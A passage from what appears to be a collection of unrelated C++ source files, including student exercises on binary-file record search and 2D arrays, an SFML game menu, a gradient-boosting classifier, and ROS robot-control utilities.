 Reader reader;\r\n    long offset = 0;\r\n\r\n    while (binary_file.read(reinterpret_cast<char*>(&reader), sizeof(Reader))) {\r\n        indexTable.push_back({ reader.ticket_number, offset });\r\n        offset += sizeof(Reader);\r\n    }\r\n\r\n    binary_file.close();\r\n}\r\n//\u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u043f\u043e \u0442\u0430\u0431\u043b\u0438\u0446\u0435 \u0438\u043d\u0434\u0435\u043a\u0441\u043e\u0432\r\nbool index_search(int key, long& offset) {\r\n    for (const auto& entry : indexTable) {\r\n        if (entry.key == key) {\r\n            offset = entry.offset;\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0437\u0430\u043f\u0438\u0441\u0438 \u043f\u043e \u0441\u043c\u0435\u0449\u0435\u043d\u0438\u044e\r\nReader read_record_by_offset(const string& binary_filename, long offset) {\r\n    ifstream binary_file(binary_filename, ios::binary);\r\n    if (!binary_file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        throw runtime_error(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430\");\r\n    }\r\n\r\n    binary_file.seekg(offset, ios::beg);\r\n    Reader reader;\r\n    binary_file.read(reinterpret_cast<char*>(&reader), sizeof(Reader));\r\n    binary_file.close();\r\n    return reader;\r\n}\r\n\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u0432\u0441\u0435\u0445 \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0438\u0437 \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430\r\nvoid display_all_records(const  string& binary_filename) {\r\n    ifstream binary_file(binary_filename, ios::binary);\r\n\r\n    if (!binary_file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        return;\r\n    }\r\n\r\n    Reader reader;\r\n    int index = 0;\r\n\r\n    // \u0427\u0442\u0435\u043d\u0438\u0435 \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0434\u043e \u043a\u043e\u043d\u0446\u0430 \u0444\u0430\u0439\u043b\u0430\r\n    while (binary_file.read(reinterpret_cast<char*>(&reader), sizeof(Reader))) {\r\n        cout << \"\u0417\u0430\u043f\u0438\u0441\u044c #\" << ++index << \"\\n\";\r\n        cout << \"\u041d\u043e\u043c\u0435\u0440 \u0431\u0438\u043b\u0435\u0442\u0430: \" << reader.ticket_number << \"\\n\";\r\n        cout << \"\u0424\u0418\u041e: \" << reader.full_name << \"\\n\";\r\n        cout << \"\u0413\u043e\u0440\u043e\u0434: \" << reader.city << \"\\n\";\r\n        cout << \"---------------------------\\n\";\r\n    }\r\n\r\n    binary_file.close();\r\n}\r\n\r\n// \u041f\u0440\u0435\u0434\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0431\u0438\u043d\u0430\u0440\u043d\u044b\u0439 \u0444\u0430\u0439\u043b \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442\r\n// \u041f\u043e\u0441\u0442\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 true, \u0435\u0441\u043b\u0438 \u0437\u0430\u043f\u0438\u0441\u044c \u043d\u0430\u0439\u0434\u0435\u043d\u0430, \u0438\u043d\u0430\u0447\u0435 false. \u0418\u043d\u0434\u0435\u043a\u0441 \u0437\u0430\u043f\u0438\u0441\u0438 \u0437\u0430\u043f\u0438\u0441\u0430\u043d \u0432 record_index\r\nbool linear_search_in_file(const  string& binary_filename, int key, int& record_index) {\r\n    ifstream binary_file(binary_filename, ios::binary);\r\n\r\n    if (!binary_file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        return false;\r\n    }\r\n\r\n    Reader reader;\r\n    int index = 0;\r\n\r\n    // \u0427\u0442\u0435\u043d\u0438\u0435 \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0438 \u043b\u0438\u043d\u0435\u0439\u043d\u044b\u0439 \u043f\u043e\u0438\u0441\u043a\r\n    while (binary_file.read(reinterpret_cast<char*>(&reader), sizeof(Reader))) {\r\n        if (reader.ticket_number == key) {\r\n            record_index = index;\r\n            binary_file.close();\r\n            return true;\r\n        }\r\n        ++index;\r\n    }\r\n\r\n    binary_file.close();\r\n    return false;\r\n}\r\n\r\n\r\n// \u041f\u0440\u0435\u0434\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0444\u0430\u0439\u043b \u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438, count > 0\r\n// \u041f\u043e\u0441\u0442\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0441 count \u0437\u0430\u043f\u0438\u0441\u044f\u043c\u0438\r\nvoid generate_text_file(const  string& filename, int count) {\r\n    ofstream file(filename);\r\n    if (!file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        return;\r\n    }\r\n\r\n    srand(time(nullptr));\r\n    vector<int> used_keys;\r\n\r\n    for (int i = 0; i < count; ++i) {\r\n        int key;\r\n        do {\r\n            key = 10000 + rand() % 90000; // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043a\u043b\u044e\u0447\u0430 (5-\u0437\u043d\u0430\u0447\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440)\r\n        } while (find(used_keys.begin(), used_keys.end(), key) != used_keys.end());\r\n\r\n        used_keys.push_back(key);\r\n\r\n        string full_name = \"Reader_\" + to_string(i + 1);\r\n        string city = \"City_\" + to_string(i % 10 + 1);\r\n\r\n        file << key << \" \" << full_name << \" \" << city << \"\\n\";\r\n    }\r\n\r\n    file.close();\r\n}\r\n\r\n// \u041f\u0440\u0435\u0434\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0434\u043e\u043b\u0436\u0435\u043d \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u0442\u044c\r\n// \u041f\u043e\u0441\u0442\u0443\u0441\u043b\u043e\u0432\u0438\u0435: \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u0431\u0438\u043d\u0430\u0440\u043d\u044b\u0439 \u0444\u0430\u0439\u043b \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435 \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430\r\nvoid convert_to_binary(const  string& text_filename, const  string& binary_filename) {\r\n    ifstream text_file(text_filename);\r\n    ofstream binary_file(binary_filename, ios::binary);\r\n\r\n    if (!text_file.is_open() || !binary_file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        return;\r\n    }\r\n\r\n    Reader reader;\r\n    while (text_file >> reader.ticket_number >> reader.full_name >> reader.city) {\r\n        binary_file.write(reinterpret_cast<char*>(&reader), sizeof(Reader));\r\n    }\r\n\r\n    text_file.close()",
    "#include \"Menu.h\"\n#include <SFML/Graphics.hpp>\nusing namespace std;\nusing namespace sf;\n\n//This function will load from file the font which will be used\nMenu::Menu(float width, float height) {\n\tfont.loadFromFile(\"./fonts/BACKTO1982.TTF\");\n\n\tMainMenu[0].setFont(font);\n\tMainMenu[0].setFillColor(Color::Black);\n\tMainMenu[0].setString(\"Play\");\n\tMainMenu[0].setCharacterSize(50);\n\tMainMenu[0].setPosition(Vector2f(285, 400));\n\n\tMainMenu[1].setFont(font);\n\t//MainMenu[1].setFillColor(Color::Black);\n\tMainMenu[1].setString(\"Tips\");\n\tMainMenu[1].setCharacterSize(50);\n\tMainMenu[1].setPosition(Vector2f(285, 530));\n\n\tMainMenu[2].setFont(font);\n\t//MainMenu[2].setFillColor(Color::Black);\n\tMainMenu[2].setString(\"Options\");\n\tMainMenu[2].setCharacterSize(50);\n\tMainMenu[2].setPosition(Vector2f(220, 660));\n\n\n\tMainMenu[3].setFont(font);\n\t//MainMenu[2].setFillColor(Color::Black);\n\tMainMenu[3].setString(\"Credits\");\n\tMainMenu[3].setCharacterSize(50);\n\tMainMenu[3].setPosition(Vector2f(220, 810));\n\n\tMainMenu[4].setFont(font);\n\t//MainMenu[3].setFillColor(Color::Black);\n\tMainMenu[4].setString(\"Exit\");\n\tMainMenu[4].setCharacterSize(50);\n\tMainMenu[4].setPosition(Vector2f(285, 950));\n\n\tButtonsText[0].setFont(font);\n\tButtonsText[0].setFillColor(Color::Black);\n\tButtonsText[0].setString(\"Restart\");\n\tButtonsText[0].setCharacterSize(45);\n\tButtonsText[0].setPosition(Vector2f(width / 2.4, height / (1.85)));\n\n\tButtonsText[1].setFont(font);\n\t//ButtonsText[0].setFillColor(Color::Black);\n\tButtonsText[1].setString(\"Quit\");\n\tButtonsText[1].setCharacterSize(45);\n\tButtonsText[1].setPosition(Vector2f(width / 2.25, height / (1.42)));\n\n\tExitText.setFont(font);\n\tExitText.setFillColor(Color::Black);\n\tExitText.setString(\"Exit\");\n\tExitText.setCharacterSize(45);\n\tExitText.setPosition(Vector2f(width / 2.4 + 60, height / (1.85)));\n\n\n\tselected = 0;\n\tselectedButton = 0;\n}\n\n\n\nMenu::~Menu() {} //New destructor\n\nvoid Menu::setSelected(int n) {\n\tselected = n;\n\n}\n\nvoid Menu::setSelectedButton(int n) {\n\tselectedButton = n;\n}\n\nvoid Menu::draw(RenderWindow& window) {\n\tfor (int i = 0; i < 5; i++) {\n\t\twindow.draw(MainMenu[i]); //To draw the text\n\t}\n}\n\nvoid Menu::drawButtons(RenderWindow& window)\n{\n\tfor (int i = 0; i < 2; ++i)\n\t\twindow.draw(ButtonsText[i]);\n}\n\nvoid Menu::MoveDown() {\n\tif (selected + 1 <= 5) {//Set exit\n\t\tMainMenu[selected].setFillColor(Color{ 187,187,187 });\n\t\tselected++;\n\t\tif (selected == 5) {\n\t\t\tselected = 0;\n\t\t}\n\t\tMainMenu[selected].setFillColor(Color::Black);\n\t}\n}\n\n\nvoid Menu::MoveUp() {\n\tif (selected - 1 >= 0) {\n\t\tMainMenu[selected].setFillColor(Color{ 187,187,187 });\n\t\tselected--;\n\t\tMainMenu[selected].setFillColor(Color::Black);\n\t}\n\telse {\n\t\tMainMenu[selected].setFillColor(Color{ 187,187,187 });\n\t\tselected = 4;  // Wrap around to the last item when moving up from the first item\n\t\tMainMenu[selected].setFillColor(Color::Black);\n\t}\n\n\n}\n\nvoid Menu::MoveButtonDown()\n{\n\tif (selectedButton + 1 <= 2) {//Set exit\n\t\tButtonsText[selectedButton].setFillColor(Color{ 187,187,187 });\n\t\tselectedButton++;\n\t\tif (selectedButton == 2) {\n\t\t\tselectedButton = 0;\n\t\t}\n\t\tButtonsText[selectedButton].setFillColor(Color::Black);\n\t}\n}\n\n\n\n\nvoid Menu::MoveButtonUp()\n{\n\tif (selectedButton - 1 >= 0) {\n\t\tButtonsText[selectedButton].setFillColor(Color{ 187,187,187 });\n\t\tselectedButton--;\n\t\tButtonsText[selectedButton].setFillColor(Color::Black);\n\t}\n\telse {\n\t\tButtonsText[selectedButton].setFillColor(Color{ 187,187,187 });\n\t\tselectedButton = 1;  // Wrap around to the last item when moving up from the first item\n\t\tButtonsText[selectedButton].setFillColor(Color::Black);\n\t}\n}",
    "// Materia: Programaci\u00f3n I, Paralelo 1\n// Autor: Mateo Enrique Gutierrez\n// Fecha creaci\u00f3n: 12/09/2024\n// N\u00famero de ejercicio: 11\n// Problema planteado: Analizar las ventas mensuales de una empresa.\n\n#include <iostream>\n#include <string>\n#include <vector>\nusing namespace std;\n\nint main() {\n    const int NUM_MESES = 12;\n    double ventas[NUM_MESES]; // Arreglo para las ventas mensuales\n    const string meses[NUM_MESES] = {\"Ene\", \"Feb\", \"Mar\", \"Abr\", \"May\", \"Jun\", \n                                       \"Jul\", \"Ago\", \"Sep\", \"Oct\", \"Nov\", \"Dic\"};\n\n    // Leer las ventas mensuales\n    cout << \"Ingrese las ventas mensuales de la empresa:\" << endl;\n    for (int i = 0; i < NUM_MESES; i++) {\n        cout << \"Ventas de \" << meses[i] << \": \";\n        cin >> ventas[i];\n    }\n\n    // Calcular las ventas m\u00e1ximas y el total de ventas\n    double ventasMaximas = ventas[0];\n    vector<string> mesesMaximos;\n    double totalVentas = 0;\n\n    for (int i = 0; i < NUM_MESES; i++) {\n        totalVentas += ventas[i]; // Sumar al total de ventas\n        if (ventas[i] > ventasMaximas) {\n            ventasMaximas = ventas[i];\n            mesesMaximos.clear(); // Limpiar la lista de meses\n            mesesMaximos.push_back(meses[i]); // A\u00f1adir el nuevo mes con ventas m\u00e1ximas\n        } else if (ventas[i] == ventasMaximas) {\n            mesesMaximos.push_back(meses[i]); // A\u00f1adir mes si es igual a las ventas m\u00e1ximas\n        }\n    }\n\n    // Mostrar resultados\n    cout << \"\\nMes(es) con ventas m\u00e1ximas: \";\n    for (const string& mes : mesesMaximos) {\n        cout << mes << \" \";\n    }\n    cout << \"\\nVentas m\u00e1ximas: \" << ventasMaximas << endl;\n    cout << \"Total de ventas: \" << totalVentas << endl;\n\n    return 0;\n}\n",
    "\n/**\n    classification_forest.cpp\n    Classification forests\n\n    @author Antoine Passemiers\n    @version 1.0 12/04/2017\n*/\n\n#include \"classification_gb.hpp\"\n\n\nnamespace scythe {\n\nClassificationGB::ClassificationGB\n        (ForestConfig* config, size_t n_instances, size_t n_features) :\n        Forest::Forest(config, n_instances, n_features) {\n    Forest::base_tree_config.task = CLASSIFICATION_TASK;\n    Forest::base_tree_config.is_complete_random = false;\n    grad_trees_config = Forest::base_tree_config;\n    grad_trees_config.task = REGRESSION_TASK;\n    this->score_metric = std::move(\n        std::shared_ptr<ClassificationError>(\n            new MultiLogLossError(config->n_classes, n_instances)));\n}\n\nfloat* ClassificationGB::fitBaseTree(VirtualDataset* dataset, VirtualTargets* targets) {\n    this->prediction_state = 0;\n    this->base_tree = *CART(\n        dataset, \n        targets,\n        &(Forest::base_tree_config), \n        this->densities.get());\n\n    // Predict with the base tree and compute the gradient of the error\n    float* probabilities = classifyFromTree(\n        dataset,\n        dataset->getNumInstances(),\n        dataset->getNumFeatures(),\n        &(this->base_tree),\n        &(Forest::base_tree_config));\n    loss_t loss = this->score_metric.get()->computeLoss(probabilities, targets);\n    printf(\"Iteration %3i / mlog-loss error : %f\\n\", 0, static_cast<double>(loss));\n    return probabilities;\n}\n\nvoid ClassificationGB::fitNewTree(VirtualDataset* dataset, VirtualTargets* gradient) {\n\n    std::shared_ptr<Tree> new_tree = std::shared_ptr<Tree>(CART(\n        dataset, gradient, &grad_trees_config, this->densities.get()));\n    Forest::trees.push_back(new_tree);\n}\n\ndata_t* ClassificationGB::predictGradient(std::shared_ptr<Tree> tree, VirtualDataset* dataset) {\n    data_t* predictions = predict(\n        dataset,\n        dataset->getNumInstances(),\n        dataset->getNumFeatures(),\n        tree.get(),\n        &grad_trees_config);\n    return predictions;\n}\n\nvoid ClassificationGB::applySoftmax(float* probabilities, data_t* F_k) {\n    size_t n_classes = dynamic_cast<ClassificationError*>(\n        this->score_metric.get())->getNumberOfClasses();\n    for (uint p = 0; p < Forest::n_instances; p++) {\n        data_t softmax_divisor = 0.0;\n        for (uint i = 0; i < n_classes; i++) {\n            softmax_divisor += std::exp(F_k[p * n_classes + i]);\n        }\n        for (uint i = 0; i < n_classes; i++) {\n            probabilities[p * n_classes + i] = static_cast<float>(\n                std::exp(F_k[p * n_classes + i]) / softmax_divisor);\n        }\n    }\n}\n\nvoid ClassificationGB::fit(VirtualDataset* dataset, VirtualTargets* targets) {\n    // Compute density functions of all features\n    Forest::preprocessDensities(dataset);\n\n    // Fit the base classification tree\n    float* probabilities = this->fitBaseTree(dataset, targets);\n\n    size_t n_classes = Forest::config.n_classes;\n\n    data_t* F_k = static_cast<data_t*>(calloc(\n        n_classes * dataset->getNumInstances(), sizeof(data_t)));\n    assert(n_classes == this->score_metric.get()->getNumberOfRequiredTrees());\n    uint n_boost = 0;\n    while (n_boost++ < Forest::config.n_iter) {\n        this->score_metric.get()->computeGradient(probabilities, targets->getValues());\n        for (uint i = 0; i < n_classes; i++) {\n            target_t* gradient = dynamic_cast<MultiLogLossError*>(\n                this->score_metric.get())->getGradientAt(i);\n            DirectTargets* vgradient = new DirectTargets(gradient, dataset->getNumInstances());\n            \n            // Fit new tree\n            this->fitNewTree(dataset, vgradient);\n            // Predict with new tree\n            data_t* predictions = this->predictGradient(Forest::trees.back(), dataset);\n\n            for (uint p = 0; p < dataset->getNumInstances(); p++) {\n                // TODO : Compute gamma according to Friedman's formulas\n                F_k[p * n_classes + i] -= Forest::config.learning_rate * predictions[p];\n            }\n            free(predictions);\n        }\n\n        this->applySoftmax(probabilities, F_k);\n\n        loss_t loss = this->score_metric.get()->computeLoss(probabilities, targets);\n        printf(\"Iteration %3i / mlog-loss error : %f\\n\", n_boost, static_cast<double>(loss));\n    }\n    free(probabilities);\n    free(F_k);\n}\n\n}",
    "\n#include \"common.h\"\n\nint main(int argc, char **argv) {\n\n  ros::init(argc, argv, \"tams_glass_poses\", 0);\n\n  ros::NodeHandle node(\"~\");\n\n  ros::AsyncSpinner spinner(4);\n  spinner.start();\n\n  if (argc < 2) {\n    ROS_ERROR_STREAM(\"usage: tams_glass poses <data.bag>\");\n    return -1;\n  }\n\n  moveit::planning_interface::MoveGroupInterface move_group(\"arm\");\n\n  moveit::core::RobotState robot_state = *move_group.getCurrentState();\n\n  ros::Publisher display_planned_path =\n      node.advertise<moveit_msgs::DisplayTrajectory>(\n          \"/move_group/display_planned_path\", 1, true);\n\n  cv::Mat mat(256, 256, CV_32F, cv::Scalar(0.0));\n  cv::imshow(\"Press key to continue\", mat);\n\n  ros::Time last_time;\n\n  {\n    rosbag::Bag bag;\n    bag.open(argv[1], rosbag::bagmode::Read);\n\n    for (const rosbag::MessageInstance &bag_message : rosbag::View(bag)) {\n\n      if (!ros::ok()) {\n        ROS_ERROR_STREAM(\"canceled\");\n        return -1;\n      }\n\n      if (bag_message.getTopic() == \"/joint_states\") {\n\n        if (auto joint_state_message =\n                bag_message.instantiate<sensor_msgs::JointState>()) {\n          auto joint_state = *joint_state_message;\n\n          if ((joint_state_message->header.stamp - last_time).toSec() < 3.0) {\n            continue;\n          }\n          last_time = joint_state_message->header.stamp;\n\n          for (size_t i = 0; i < joint_state.name.size(); i++) {\n            robot_state.setVariablePosition(joint_state.name[i],\n                                            joint_state.position[i]);\n          }\n          robot_state.update(true);\n          robot_state.updateLinkTransforms();\n\n          moveit_msgs::DisplayTrajectory msg;\n\n          for (size_t i = 0; i < 2; i++) {\n            msg.trajectory.emplace_back();\n            msg.trajectory.back().joint_trajectory.joint_names =\n                robot_state.getVariableNames();\n            msg.trajectory.back().joint_trajectory.points.emplace_back();\n            for (auto &n : msg.trajectory.back().joint_trajectory.joint_names) {\n              msg.trajectory.back()\n                  .joint_trajectory.points.back()\n                  .positions.emplace_back(robot_state.getVariablePosition(n));\n            }\n          }\n\n          msg.trajectory_start.joint_state = joint_state;\n\n          display_planned_path.publish(msg);\n\n          cv::waitKey(0);\n        }\n      }\n    }\n  }\n}",
    "// this is for emacs file handling -*- mode: c++; indent-tabs-mode: nil -*-\n\n// -- BEGIN LICENSE BLOCK ----------------------------------------------\n// Copyright 2019 FZI Forschungszentrum Informatik\n// Created on behalf of Universal Robots A/S\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n// -- END LICENSE BLOCK ------------------------------------------------\n\n//----------------------------------------------------------------------\n/*!\\file\n *\n * \\author  Felix Exner exner@fzi.de\n * \\date    2019-10-21\n *\n */\n//----------------------------------------------------------------------\n\n#include <ros/ros.h>\n#include <ur_robot_driver/dashboard_client_ros.h>\n\n#include <ur_robot_driver/urcl_log_handler.h>\n\nint main(int argc, char** argv)\n{\n  // Set up ROS.\n  ros::init(argc, argv, \"dashboard_client\");\n  ros::NodeHandle priv_nh(\"~\");\n\n  ur_driver::registerUrclLogHandler();\n\n  // The IP address under which the robot is reachable.\n  std::string robot_ip = priv_nh.param<std::string>(\"robot_ip\", \"192.168.56.101\");\n\n  ur_driver::DashboardClientROS client(priv_nh, robot_ip);\n\n  ros::spin();\n  return 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\nint main(){\n    const int N = 5;\n    const int M = 5;\n\n    int arr[N][M] = {};\n\n    int sum = 0;\n    int min = 101, max = -101;\n\n    int count = 0;\n\n\n    // task 1\n    cout << \"---------------1---------------\" << endl;\n\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = rand() % 21;\n        }\n    }\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            sum += arr[i][j];\n            \n            if (min > arr[i][j]){\n                min = arr[i][j];\n            }\n            if (max < arr[i][j]){\n                max = arr[i][j];\n            }\n        }\n    }\n\n    cout << \"Sum: \" << sum << endl;\n    cout << \"Avrg.: \" << sum / (M * N) << endl;\n    cout << \"Min: \" << min << endl;\n    cout << \"Max: \" << max << endl;\n\n    \n    // task 2\n    cout << \"---------------2---------------\" << endl;\n    \n    \n    int sum1 = 0, sum2 = 0;\n    \n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = rand() % 21;\n        }\n    }\n    \n    if (M > N){\n        for (int i = 0; i < N; i++){\n            sum1 += arr[i][i];\n            sum2 += arr[i][M-i];\n        }\n    } else {\n        for (int i = 0; i < N; i++){\n            sum1 += arr[i][i];\n            sum2 += arr[i][N-i];\n        }\n    }\n\n    cout << \"Main diagonal: \" << sum1 << endl;\n    cout << \"Sub diagonal: \" << sum2 << endl;\n\n\n    // task 3\n    cout << \"---------------3---------------\" << endl;\n\n\n    int neg = 0, pos = 0, zer = 0;\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = (rand() % 21) -10;\n        }\n    }\n    \n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            if(arr[i][j] > 0){\n                pos++;\n            } else if (arr[i][j] < 0){\n                neg++;\n            } else{\n                zer++;\n            }\n        }\n    }\n\n    cout << \"Positive's: \" << pos << endl;\n    cout << \"Negative's: \" << pos << endl;\n    cout << \"Zero's: \" << pos << endl;\n\n\n    // task 4\n    cout << \"---------------4---------------\" << endl;\n\n    int rows[N] = {};\n    int cols[M] = {};\n\n    sum = 0;\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = rand() % 21;\n        }\n    }\n\n    cout << \"Row sum: \" << endl << \"    \";\n    for(int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++)\n        {\n           sum += arr[i][j];\n        }\n        \n        rows[i] = sum;\n        \n        cout << i << \": \" << sum << \";  \";\n\n        sum = 0; \n    }\n\n    cout << \"Col sum: \" << endl << \"    \";\n    for(int i = 0; i < M; i++){\n        for (int j = 0; j < N; j++)\n        {\n           sum += arr[j][i];\n        }\n        \n        cols[i] = sum;\n        \n        cout << i << \": \" << sum << \";  \";\n\n        sum = 0; \n    }\n\n    cout << endl;\n\n\n    // task 5 - \u043d\u043e\u043c\u0435\u0440 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438 \u0441\u0442\u043e\u043b\u0431\u0446\u0430 \u044f \u043f\u043e\u043d\u044f\u043b \u043a\u0430\u043a 1, 2, 3, 4 ...\n    cout << \"---------------5---------------\" << endl;\n\n\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = (i+1)*10 + (j+1);\n            cout << arr[i][j] << \", \";\n        }\n        cout << endl;\n    }\n\n\n    // task 6  {0 <-> 1 <-> 2 <-> 3, 4}?\n    cout << \"---------------6---------------\" << endl;\n\n\n    int temp;\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = j + (i * 5);\n        }\n    }\n\n    for (int i = 0; i < N; i++){\n        for (int j = 1; j < M; j += 2){\n            temp = arr[i][j-1];\n            arr[i][j-1] = arr[i][j];\n            arr[i][j] = temp;\n        }\n        cout << endl;\n    }\n\n    for(int i = 0; i < N; i++){\n        for(int j = 0; j < M; j++){\n            cout << arr[i][j] << \", \";\n        }\n        cout << endl;\n    }\n\n\n    // task 7\n    cout << \"---------------7---------------\" << endl;\n\n\n    max = -101, min = 101;\n    int MinC = 0, MaxC = 0;\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = rand() % 201 - 100;\n        }\n    }\n\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            if (min > arr[i][j]){\n                min = arr[i][j];\n                MinC = count;\n            }\n            if (max < arr[i][j]){\n                max = arr[i][j];\n                MaxC = count;\n            }\n            cout << arr[i][j] << \", \";\n            count++;\n        }\n        cout << endl;\n    }\n\n    count = 0;\n    if (MinC > MaxC){\n        for (int i = MaxC; i <= MinC; i++){\n            count += arr[i/N][i%M];\n        }\n    } else {\n        for (int i = MinC; i <= MaxC; i++){\n            count += arr[i/N][i%M];\n        }\n    }\n\n    cout << endl;\n    cout << count << endl;\n\n\n    // task 9\n    cout << \"---------------8---------------\" << endl;\n\n\n    count = 1;\n    for (int i = 0; i < N; i++){\n        for (int j = 0; j < M; j++){\n            arr[i][j] = count;\n            if (count < 10){\n                cout << count << \",  \";\n       ",
    "#include <iostream>\n#include <deque>\n#include <string>\n#include <iomanip>\n#include <algorithm>\n#include <utility>\n#include \"Workstation.h\"\n#include \"CustomerOrder.h\"\n#include \"Station.h\"\nusing namespace std;\n\nnamespace seneca {\n\n\tdeque<CustomerOrder> g_pending{};\n\tdeque<CustomerOrder> g_completed{};\n\tdeque<CustomerOrder> g_incomplete{};\n\n\tWorkstation::Workstation(const string& str) : Station(str) {}\n\t\n\tvoid Workstation::fill(ostream& os) {\n\t\tif (!m_orders.empty()) m_orders.front().fillItem(*this, os);\n\t}\n\n\tbool Workstation::attemptToMoveOrder() {\n\t\tbool isMoved = false;\n\t\tif (!m_orders.empty()) {\n\t\t\tif (m_orders.front().isItemFilled(getItemName()) || getQuantity() == 0) {\n\t\t\t\tif (m_pNextStation) {\n\t\t\t\t\tm_pNextStation->m_orders.push_back(move(this->m_orders.front()));\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif (m_orders.front().isOrderFilled()) {\n\t\t\t\t\t\tg_completed.push_back(move(m_orders.front()));\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tg_incomplete.push_back(move(m_orders.front()));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tm_orders.pop_front();\n\t\t\t\tisMoved = true;\n\t\t\t}\n\t\t}\n\t\treturn isMoved;\n\t}\n\n\tvoid Workstation::setNextStation(Workstation* station = nullptr) {\n\t\tm_pNextStation = station;\n\t}\n\n\tWorkstation* Workstation::getNextStation() const {\n\t\treturn m_pNextStation;\n\t}\n\n\tvoid Workstation::display(ostream& os) const {\n\t\tos << getItemName() << \" --> \";\n\t\tif (m_pNextStation) os << m_pNextStation->getItemName() << \"\\n\";\n\t\telse os << \"End of Line\\n\";\n\t}\n\n\tWorkstation& Workstation::operator+=(CustomerOrder&& newOrder) {\n\t\tm_orders.push_back(move(newOrder));\n\t\treturn *this;\n\t}\n\n}",
